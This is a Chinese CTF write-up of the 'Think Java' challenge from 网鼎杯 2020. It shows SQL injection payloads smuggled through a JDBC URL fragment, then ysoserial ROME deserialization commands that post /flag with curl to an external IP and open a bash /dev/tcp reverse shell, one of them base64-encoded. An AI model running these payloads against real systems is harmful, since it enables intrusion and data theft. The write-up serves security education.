---
title: 初探Java
date: 2026-03-09 14:11:27
tags:
index_img: https://gitee.com/bobrocket/img/raw/master/20260316-203824-f7efea.png
categories: CTF
---

通过几个题目入门Java

## [网鼎杯 2020 朱雀组]Think Java

题目给出了部分源码，先看Test.class

```java
import io.swagger.annotations.ApiOperation;  //使用了swagger进行接口的测试

@CrossOrigin
@RestController  //标识这是一个控制器，且返回值直接序列化为 JSON 数据
@RequestMapping({"/common/test"})  //定义了这个控制器的基础 URL 路径。所有该类中的接口都需要加上这个前缀。
public class Test {
    @PostMapping({"/sqlDict"})  //定义具体的接口路径为 /sqlDict 请求方式必须是 POST
    @Access
    @ApiOperation("为了开发方便对应数据库字典查询")
    public ResponseResult sqlDict(String dbName) throws IOException {
        List<Table> tables = SqlDict.getTableData(dbName, "root", "abc@12345");
        return ResponseResult.e(ResponseCode.OK, tables);
    }
}
```

从这里我们不难发现api接口，访问 http://xxx/swagger-ui.html

![image-20260309160348837](https://gitee.com/bobrocket/img/raw/master/img/image-20260309160348837.png)

再看SqlDict.class

```java
public class SqlDict {
    public static Connection getConnection(String dbName, String user, String pass) {
        Connection conn = null;

        try {
            Class.forName("com.mysql.jdbc.Driver");
            if (dbName != null && !dbName.equals("")) {
                dbName = "jdbc:mysql://mysqldbserver:3306/" + dbName;
            } else {
                dbName = "jdbc:mysql://mysqldbserver:3306/myapp";
            }

            if (user == null || dbName.equals("")) {
                user = "root";
            }

            if (pass == null || dbName.equals("")) {
                pass = "abc@12345";
            }

            conn = DriverManager.getConnection(dbName, user, pass);
        } catch (ClassNotFoundException var5) {
            var5.printStackTrace();
        } catch (SQLException var6) {
            var6.printStackTrace();
        }

        return conn;
    }

    public static List<Table> getTableData(String dbName, String user, String pass) {
        List<Table> Tables = new ArrayList();
        Connection conn = getConnection(dbName, user, pass);
        String TableName = "";

        try {
            Statement stmt = conn.createStatement();
            DatabaseMetaData metaData = conn.getMetaData();
            ResultSet tableNames = metaData.getTables((String)null, (String)null, (String)null, new String[]{"TABLE"});

            while(tableNames.next()) {
                TableName = tableNames.getString(3);
                Table table = new Table();
                String sql = "Select TABLE_COMMENT from INFORMATION_SCHEMA.TABLES Where table_schema = '" + dbName + "' and table_name='" + TableName + "';";
                ResultSet rs = stmt.executeQuery(sql);

                while(rs.next()) {
                    table.setTableDescribe(rs.getString("TABLE_COMMENT"));
                }

                table.setTableName(TableName);
                ResultSet data = metaData.getColumns(conn.getCatalog(), (String)null, TableName, "");
                ResultSet rs2 = metaData.getPrimaryKeys(conn.getCatalog(), (String)null, TableName);

                String PK;
                for(PK = ""; rs2.next(); PK = rs2.getString(4)) {
                }

                while(data.next()) {
                    Row row = new Row(data.getString("COLUMN_NAME"), data.getString("TYPE_NAME"), data.getString("COLUMN_DEF"), data.getString("NULLABLE").equals("1") ? "YES" : "NO", data.getString("IS_AUTOINCREMENT"), data.getString("REMARKS"), data.getString("COLUMN_NAME").equals(PK) ? "true" : null, data.getString("COLUMN_SIZE"));
                    table.list.add(row);
                }

                Tables.add(table);
            }
        } catch (SQLException var16) {
            var16.printStackTrace();
        }

        return Tables;
    }
}
```

那么我们不难发现SQL注入点

```
String sql = "Select TABLE_COMMENT from INFORMATION_SCHEMA.TABLES Where table_schema = '" + dbName + "' and table_name='" + TableName + "';";
```

这里需要注意

```
dbName = "jdbc:mysql://mysqldbserver:3306/" + dbName;
```

所以在注入的同时需要满足 jdbc 协议的连接不能出错

> JDBC 的 URL 也类似 http 请求中的 URL，也可以使用锚点 # 或者 ? 
>
> 如：jdbc:mysql://mysqldbserver:3306/myapp#’ union select 2#

下面我们构造SQL注入语句

```
myapp#' union select group_concat(SCHEMA_NAME) from information_schema.schemata#
myapp#' union select group_concat(table_name) from information_schema.tables where table_schema=database()#
myapp#' union select group_concat(column_name) from information_schema.columns where table_name='user'#
myapp#' union select group_concat(pwd) from myapp.user#
```

成功获得用户名amdin密码admin@Rrrr_ctf_asde

![image-20260309163805589](https://gitee.com/bobrocket/img/raw/master/img/image-20260309163805589.png)

登录成功，返回一个auth头

```
rO0ABXNyABhjbi5hYmMuY29yZS5tb2RlbC5Vc2VyVm92RkMxewT0OgIAAkwAAmlkdAAQTGphdmEvbGFuZy9Mb25nO0wABG5hbWV0ABJMamF2YS9sYW5nL1N0cmluZzt4cHNyAA5qYXZhLmxhbmcuTG9uZzuL5JDMjyPfAgABSgAFdmFsdWV4cgAQamF2YS5sYW5nLk51bWJlcoaslR0LlOCLAgAAeHAAAAAAAAAAAXQABWFkbWlu
```

下方的特征可以作为序列化的标志参考:
一段数据以`rO0AB`开头，你基本可以确定这串就是Java序列化base64加密的数据。
或者如果以`aced`开头，那么他就是这一段Java序列化的16进制。

这里用SerializationDumper工具查看16进制序列化内容

![image-20260309164756013](https://gitee.com/bobrocket/img/raw/master/img/image-20260309164756013.png)

![image-20260309164552237](https://gitee.com/bobrocket/img/raw/master/img/image-20260309164552237.png)

可以猜测到这个内容是与用户信息有关的， 正好还有一个接口：`/common/user/current` 是用来获取用户信息 将data内容输入到该接口中

![image-20260309164948507](https://gitee.com/bobrocket/img/raw/master/img/image-20260309164948507.png)

auth 头是一个序列化后的信息，在查看用户信息时提交这个Bearer token进行反序列化

我们这里用工具分析一下

![image-20260311161954140](https://gitee.com/bobrocket/img/raw/master/img/image-20260311161954140.png)

用ysoserial工具生成payload

```
java -jar .\ysoserial-all.jar ROME "curl http://183.66.27.22:18546 -d @/flag" > flag.bin
```

由于ctfhub把flag文件名改了，这里只能用bash了

```
bash >& /dev/tcp/183.66.27.22/18546 0>&1
```

```
java -jar ysoserial-all.jar ROME "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xODMuNjYuMjcuMjIvMTg1NDYgMD4mMQ==}|{base64,-d}|{bash,-i}" > a.bin
```

编码，传入

![image-20260309173109996](https://gitee.com/bobrocket/img/raw/master/img/image-20260309173109996.png)
